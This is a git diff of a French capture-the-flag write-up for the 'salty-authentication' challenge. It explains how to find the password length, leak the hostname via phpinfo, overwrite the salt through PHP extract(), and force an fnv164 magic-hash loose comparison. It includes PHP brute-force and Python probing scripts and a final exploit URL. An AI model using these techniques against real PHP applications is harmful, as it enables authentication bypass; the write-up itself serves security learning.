@@ -24,6 +24,14 @@ On va devoir vérifier les 2 conditions afin de pouvoir afficher le flag.
 
 ## Conditions
 
+{{< admonition type=tip title="Résolution" open=true >}}
+Nous devons:
+- Trouver la longueur du mot de passe
+- Générer une collision entre **fnv164(password) == fn16v4(hostname+salt)**
+{{< /admonition >}}
+
+## Longueur du password
+
 Si l'on fournit en `GET` un parametre `?password=test` les comparaisons échouent et le même code source est affiché.
 
 Voici un petit script pour trouver la longueur:
@@ -34,13 +42,8 @@ import requests, time
 url = "https://salty-authentication.france-cybersecurity-challenge.fr/?password="
 params_template = {"password": ""}
 
-'''
-$salt = bin2hex(random_bytes(12));  # 24 chars
+#$salt = bin2hex(random_bytes(12));  # 24 chars minimum pour secret
 
-extract($_GET);
-
-$secret = gethostname() . $salt;
-'''
 for i in range(24, 40):
         params = params_template.copy()
         response = requests.get(url+'a'*i)
@@ -51,40 +54,8 @@ for i in range(24, 40):
 
 Nous trouvons une longueur de `36`.
 
-## Magic hash
-
-On remarque tout de suite la 2nde condition `if (hash('fnv164', $password) == hash('fnv164', $secret))`:
-
-Voici un script permettant de faire un magic hash de la bonne taille pour forcer un `===0`
-
-```php
-<?php
-
-$counter =0;
-while(1){
-    $p = bin2hex(random_bytes(18));
-    $counter+=1;
-    if (hash('fnv164',$p)==0) {
-
-        $h = hash('fnv164',$p); 
-        echo $p;
-        echo "\n";
-        echo $h;
-        echo "\n";
-        echo $counter;
-        exit();
-
-    }
-}
-
-?>
-```
-
-![](./wrong.png)
-
-Et après le `random` est bien embêtant ...
-
-On pourrait bruteforcer pendant des heures avec ce genre de script mais c'est interdit x)
+Bien, toutefois le `salt` inconnu est bien embêtant ...
+On pourrait bruteforcer pendant des heures avec ce genre de script mais c'est interdit:
 
 ```python
 import sys
@@ -108,13 +79,17 @@ while True:
         i+=1
 ```
 
-## Extract()?
+## Leak du hostname via phpinfo() ?
 
-En me repenchant dessus j'ai trouvé une vuln: on peut appeler `log_attack`:
-Voir:
+Le principal souci pour vérifier la 2nde condition est que **nous ne connaissons ni hostname, ni salt**.
+Nous allons trouver `hostname`, vous verrez l'utilité dans la partie suivante.
 
-- https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md
-- https://davidnoren.com/post/php-extract-vulnerability/
+En me repenchant dessus j'ai trouvé une vulnérabilité: on peut appeler une certaine fonction `log_attack` lors de l'**exit()**:
+
+```
+log_attack=phpinfo
+//le serveur éxécute: exit($log_attack)
+```
 
 ![](./log_attack.png)
 
@@ -122,30 +97,95 @@ Et récupérer le hostname:
 
 ![](./hostname.png)
 
-## Réinitialisation du salt
+## Réinitialisation du salt via extract()
 
-On réutilise notre script PHP.
-
-Grâce à extract on peut:
-
-- préciser notre premier salt
-- mettre un 2nd password (avec un nouveau salt) pour avoir 
+Une fonction saute au yeux dans ce code, à quoi sert-elle?
 
 ```php
-$password !== $secret
+$salt = bin2hex(random_bytes(12));
+
+extract($GET);
+
+$secret = gethostname().$salt;
 ```
 
-et
+Ici réside ce qui nous permettra d'outrepasser la 2nde condition.
+On trouve rapidement quelques ressources sur extract:
 
-```php
-hash('fnv164', $password) == hash('fnv164', $secret)
-```
+- https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md
+- https://davidnoren.com/post/php-extract-vulnerability/
+
+`PHP has a function named extract() to take all provided GET and POST requests and assign them to internal variables. Developers will, at times, use this function instead of manually assigning $_POST[var1] to $var1. This function will overwrite any previously defined variables, including server variables.
+`
+
+Ici nous allons par la **register global** $SERVER.
+En échouant la vérification nous allons pouvoir écraser le variable `salt`.
+
+Grâce à **extract** on peut:
+
+- préciser notre password
+- **écraser le salt** afin de contrôler la loose comparison.
 
 ![](./solve.png)
 
-On a plus qu'à:
+{{< admonition type=tip title="Loose Comparison" open=true >}}
+0e1234 == 0e4321 == 0
+{{< /admonition >}}
 
-`https://salty-authentication.france-cybersecurity-challenge.fr/?password=HASH_DU_SECRET&log_attack=extract($_SERVER);&salt=NOUVEAU_SALT`
+On remarque tout de suite la 2nde condition `if (hash('fnv164', $password) == hash('fnv164', $secret))`:
+
+Voici un script permettant de trouver un password de 36 caractères pour forcer une [Loose comparison](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf)
+
+```php
+<?php
+
+$counter =0;
+while(1){
+    $p = bin2hex(random_bytes(18));
+    $counter+=1;
+    if (hash('fnv164',$p)==0) {
+
+        $h = hash('fnv164',$p); 
+        echo $p;
+        echo "\n";
+        echo $h;
+        echo "\n";
+        echo $counter;
+        exit();
+
+    }
+}
+?>
+```
+
+![](./wrong.png)
+
+Résumons:
+
+```php
+hostname = "9be4a60f645f";
+
+password = "9be4a60f645fa74b424f8617e4d9fccfd023";
+password2 = "9be4a60f645f"."b39ea06afe7bc4f917472748";
+
+/*
+https://salty-authentication.france-cybersecurity-challenge.fr/?password=<password>
+&log_attack=extract($_SERVER);&salt="b39ea06afe7bc4f917472748"
+*/
+
+$salt = "????????????????????????";
+//extract($GET)
+$salt = "b39ea06afe7bc4f917472748";
+
+//1ère condition
+$secret = "9be4a60f645f"."b39ea06afe7bc4f917472748" //===$password2
+//password != password2
+
+
+//2nde condition
+hash('fnv164',$password) === 0e58654062616816 == 0
+hash('fnv164',$secret) === hash('fnv164',$password2) == 00e9125834043228 == 0
+```
 
 Tada!!
 
